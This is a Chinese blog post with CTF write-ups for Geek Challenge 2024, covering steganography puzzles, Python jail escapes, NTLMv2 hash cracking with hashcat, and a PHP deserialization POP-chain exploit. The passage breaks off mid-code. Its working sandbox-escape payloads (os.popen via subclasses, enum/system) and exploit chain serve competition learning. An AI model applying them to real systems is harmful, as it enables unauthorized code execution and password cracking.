<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>极客大挑战2024 wp | L的博客</title><meta name="author" content="L"><meta name="copyright" content="L"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="misc雪   压缩包尾部有隐写，可以得到解压密码。打开后有一张图片和一堆空白字体猜测为snow隐写图片存在盲水印得到snow隐写的key得到flag doSomeMath   我们可以看到在元组中存在__ge__魔术方法，其逻辑是大于等于，那么我们只要().__ge__(())就可以得到True True+True&#x3D;2。构造出数字和其实就是一步步算上去了   Secret of Starven">
<meta property="og:type" content="article">
<meta property="og:title" content="极客大挑战2024 wp">
<meta property="og:url" content="https://lisien11.xyz/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/index.html">
<meta property="og:site_name" content="L的博客">
<meta property="og:description" content="misc雪   压缩包尾部有隐写，可以得到解压密码。打开后有一张图片和一堆空白字体猜测为snow隐写图片存在盲水印得到snow隐写的key得到flag doSomeMath   我们可以看到在元组中存在__ge__魔术方法，其逻辑是大于等于，那么我们只要().__ge__(())就可以得到True True+True&#x3D;2。构造出数字和其实就是一步步算上去了   Secret of Starven">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://raw.githubusercontent.com/lisien11/lisien11.github.io/refs/heads/master/cover/cover37.jpg">
<meta property="article:published_time" content="2024-10-31T15:48:48.000Z">
<meta property="article:modified_time" content="2024-11-22T07:00:00.638Z">
<meta property="article:author" content="L">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/lisien11/lisien11.github.io/refs/heads/master/cover/cover37.jpg"><link rel="shortcut icon" href="/img/1.jpg"><link rel="canonical" href="https://lisien11.xyz/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":true,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '极客大挑战2024 wp',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-11-22 15:00:00'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><link rel="stylesheet" href="/css/LSE.css"><meta name="generator" content="Hexo 7.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://raw.githubusercontent.com/lisien11/lisien11.github.io/refs/heads/master/%E5%9B%BE%E7%89%87/1231.jpg" onerror="onerror=null;src='/img/lll.png'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">132</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">45</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">43</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://raw.githubusercontent.com/lisien11/lisien11.github.io/refs/heads/master/cover/cover37.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="L的博客"><span class="site-name">L的博客</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">极客大挑战2024 wp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-10-31T15:48:48.000Z" title="发表于 2024-10-31 23:48:48">2024-10-31</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-11-22T07:00:00.638Z" title="更新于 2024-11-22 15:00:00">2024-11-22</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">8.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>40分钟</span></span><span class="post-meta-separator">|</span><span id="" data-flag-title="极客大挑战2024 wp"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="twikoo_visitors"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="雪"><a href="#雪" class="headerlink" title="雪"></a>雪</h2><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241115-143524680.png" class="">  
<p>压缩包尾部有隐写，可以得到解压密码。<br>打开后有一张图片和一堆空白字体猜测为snow隐写<br>图片存在盲水印<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241115-143652853.png" class=""><br>得到snow隐写的key<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241115-143712469.png" class=""><br>得到flag</p>
<h2 id="doSomeMath"><a href="#doSomeMath" class="headerlink" title="doSomeMath"></a>doSomeMath</h2><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241104-162058378.png" class="">  
<p>我们可以看到在元组中存在<code>__ge__</code>魔术方法，其逻辑是大于等于，那么我们只要<code>().__ge__(())</code>就可以得到True True+True=2。构造出数字和其实就是一步步算上去了<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241031-234942312.png" class=""><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241031-234909658.png" class="">  </p>
<h2 id="Secret-of-Starven"><a href="#Secret-of-Starven" class="headerlink" title="Secret of Starven"></a>Secret of Starven</h2><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-110903265.png" class="">  
<p>打开流量包，我们导出文件会发现有一张图片和压缩包，说实话图片还挺好看(嘿嘿)<br>压缩包需要密码，图片没有什么隐写，猜测密码应该外SMB的密钥，通过流量包来构造hash值</p>
<p>username::damonname: server challenge:ntproofstr:无ntproofstr的ntlmv2_response<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-111309721.png" class=""><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-111444728.png" class=""><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-111508123.png" class="">  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Starven::192.168.11.20:9a35e37a04717230:189bf0b02d2f766af2242dc455ad4fe1:0101000000000000ca1f069a8a09db01980131a514a3d32d0000000002001e004400450053004b0054004f0050002d00510032004200390044004900410001001e004400450053004b0054004f0050002d00510032004200390044004900410004001e004400450053004b0054004f0050002d00510032004200390044004900410003001e004400450053004b0054004f0050002d00510032004200390044004900410007000800ca1f069a8a09db010600040002000000080030003000000000000000010000000020000044063d2e3ec53e332816d81a43ec5914e72ef2dc0599bfa08788e043eb523af80a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e00310031002e00320030000000000000000000</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -O -a 0 -m 5600 2.hash /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
<p>使用hashcode爆破<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-110735713.png" class=""><br>解压压缩包<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-110839450.png" class="">  </p>
<h2 id="hard-jail"><a href="#hard-jail" class="headerlink" title="hard_jail"></a>hard_jail</h2><p>查看源码我们可以发现其过滤了引号括号和@<br>参考文章<a target="_blank" rel="noopener" href="https://www.tr0y.wang/2022/06/27/OrangeKiller_CTF_2_wp/">https://www.tr0y.wang/2022/06/27/OrangeKiller_CTF_2_wp/</a><br>通过文章我们可以知道可以试用enum来进行逃逸payload如下<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import enum</span><br><span class="line">from os import system</span><br><span class="line"></span><br><span class="line">enum.EnumMeta.__getitem__ = system</span><br><span class="line">enum.Enum[request.args[&#123;&#125;.__doc__[2]+&#123;&#125;.__doc__[15]+&#123;&#125;.__doc__[0]]]</span><br></pre></td></tr></table></figure><br>但是题目因为50个字符的限制我们无法直接照搬，最后的命令执行部分我们可以用<code>a=[].__doc__[i]</code>的方法来对变量进行赋值，然后再拼接变量即可<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">for j in &quot;env&quot;:</span><br><span class="line">    for i in range(1,100):</span><br><span class="line">        if [].__doc__[i]==j:</span><br><span class="line">            print(&#123;&#125;.__doc__[i])</span><br><span class="line">            print(&quot;%c=[].__doc__[%d]&quot; %(j,i))</span><br><span class="line">            break</span><br></pre></td></tr></table></figure><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241112-002556300.png" class="">  </p>
<img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241112-002536906.png" class="">  
<h2 id="Truth-of-Word"><a href="#Truth-of-Word" class="headerlink" title="Truth of Word"></a>Truth of Word</h2><p>在宏里有flag2<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-112720393.jpg" class=""><br>word里调色有flag1<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-112727102.jpg" class=""><br>解压word可以找到flag3<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-112731032.jpg" class=""><br>拼起来就是flag（好久之前截的图了，题目也不能再次提交flag，但应该没有错）</p>
<h2 id="Welcome-jail"><a href="#Welcome-jail" class="headerlink" title="Welcome_jail"></a>Welcome_jail</h2><p>python逃逸可以禁用了很多但是可以使用ssti的方法来做，字符串全使用chr(xxx)来进行代替从而绕过引号等<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;输入字符串&#x27;</span>)</span><br><span class="line">    s = <span class="built_in">str</span>(<span class="built_in">input</span>())</span><br><span class="line">    pay = <span class="string">&quot;print(().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[chr(112)+chr(111)+chr(112)+chr(101)+chr(110)](&#123;&#125;).read())&quot;</span></span><br><span class="line">    ch = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        ch+=<span class="string">&quot;chr(&#123;&#125;)+&quot;</span>.<span class="built_in">format</span>(<span class="built_in">ord</span>(i))</span><br><span class="line">    <span class="keyword">if</span> ch.endswith(<span class="string">&#x27;+&#x27;</span>):</span><br><span class="line">        ch = ch[:-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(pay.<span class="built_in">format</span>(ch))</span><br></pre></td></tr></table></figure><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[chr(112)+chr(111)+chr(112)+chr(101)+chr(110)](chr(102)+chr(105)+chr(110)+chr(100)+chr(32)+chr(47)+chr(32)+chr(45)+chr(110)+chr(97)+chr(109)+chr(101)+chr(32)+chr(34)+chr(102)+chr(108)+chr(97)+chr(103)+chr(34)).read())</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>发现flag在/home/ctf/flag里<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-113854792.png" class="">  </p>
<img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-113311916.png" class="">  
<h2 id="舔狗的觉醒"><a href="#舔狗的觉醒" class="headerlink" title="舔狗的觉醒"></a>舔狗的觉醒</h2><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-125248135.png" class="">  
<p>密码可以爆破<br>解压后又是一个压缩包的字节翻转<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-125455997.png" class=""><br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">process_hex_file</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="comment"># 读取文件内容</span></span><br><span class="line">        hex_str = file.read()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 移除空格和换行符</span></span><br><span class="line">        hex_str = hex_str.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 翻转每两个字符</span></span><br><span class="line">        reversed_str = <span class="string">&#x27;&#x27;</span>.join([hex_str[i+<span class="number">1</span>] + hex_str[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(hex_str), <span class="number">2</span>)])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> reversed_str</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例调用</span></span><br><span class="line">file_path = <span class="string">&#x27;c:\\Users\\24882\\Downloads\\舔狗的觉醒\\byte-revenge.txt&#x27;</span>  <span class="comment"># 替换为你的文件路径</span></span><br><span class="line">result = process_hex_file(file_path)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>解压后得到一个flag.pdf<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-130302330.png" class=""><br>将其转为word<br>解压word后得到如下图片<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-130515552.png" class="">  </p>
<h2 id="cimbar"><a href="#cimbar" class="headerlink" title="cimbar"></a>cimbar</h2> <img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-114301834.png" class="">  
<p>网上搜可以搜到这个开源项目<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-114832885.png" class=""><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-114944458.png" class="">  </p>
<p>在实现细节可以找到每个符号对应的二进制。题目的符号是两个一组，其实就是将组成的值转为ascii码字符罢了<br>得到如下二进制<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">01010011 01011001 01000011 01111011 01000001 01101110 00110000 01110100 01101000 00110011 01110010 01011111 01000001 01101101 01000000 01111010 00110001 01101110 00111001 01011111 01010001 01010010 01011111 01000011 01101111 00110100 01100101 01111101</span><br></pre></td></tr></table></figure><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-115110431.png" class=""><br>因为是解后过了很久又再写的，思路是没问题的，因为无法再次提交flag所以在转二进制的步骤中可能会有点小问题。但是思路是绝对没问题的</p>
<h2 id="ez-jpg"><a href="#ez-jpg" class="headerlink" title="ez_jpg"></a>ez_jpg</h2><p>打开福建是一段base64编码<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-120534904.png" class=""><br>可以发现是颠倒的jpg图片<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-120951065.jpg" class=""><br>得到的图片如上，明显是宽高出了问题，我们从气左右偏移可以猜测出是宽度出来问题，接下来就是不断的调整了最后在产生到8是得到了可以完美的图片<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-121751506.png" class=""><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-121909337.png" class="">  </p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h2><p>exp<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Class SYC&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$starven</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/%|iconv|UCS|UTF|rot|quoted|base|zlib|zip|read/i&#x27;</span>,<span class="variable">$this</span>-&gt;starven))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;no hack&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;starven,<span class="string">&quot;&lt;?php exit();&quot;</span>.<span class="variable">$this</span>-&gt;starven);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Class lover&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$J1rry</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$meimeng</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;J1rry)&amp;&amp;<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;J1rry)==<span class="string">&#x27;Welcome GeekChallenge 2024&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;meimeng-&gt;source;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;meimeng;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Class Geek&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$GSBP</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$Challenge</span> = <span class="variable language_">$this</span>-&gt;GSBP;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$Challenge</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;GSBP-&gt;<span class="title function_ invoke__">Getflag</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Just do it&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">lover</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;meimeng=<span class="keyword">new</span> <span class="title class_">Geek</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;meimeng-&gt;GSBP=<span class="keyword">new</span> <span class="title function_ invoke__">lover</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;meimeng-&gt;GSBP-&gt;meimeng=<span class="keyword">new</span> <span class="title class_">Geek</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;meimeng-&gt;GSBP-&gt;meimeng-&gt;GSBP=<span 